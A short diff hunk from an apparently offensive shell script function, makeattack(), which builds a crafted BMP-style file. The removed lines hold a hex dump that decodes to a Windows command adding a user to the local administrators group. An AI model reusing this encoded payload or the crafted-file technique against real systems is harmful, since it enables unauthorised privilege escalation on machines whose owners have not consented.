@@ -41,12 +41,6 @@ makeattack() {
 # In addition, this is a test to see if users could be added to a system 
 # using the same techniques as described above
 #
-0000000 63 6d 64 2e 65 78 65 20 2f 63 20 6e 65 74 20 6c
-0000010 6f 63 61 6c 67 72 6f 75 70 20 61 64 6d 69 6e 69
-0000020 73 74 72 61 74 6f 72 73 20 4a 6f 68 6e 20 2f 61
-0000030 64 64 0a 
-#
-#
 #
 \x42\x4d\x4a\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\
 \x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\
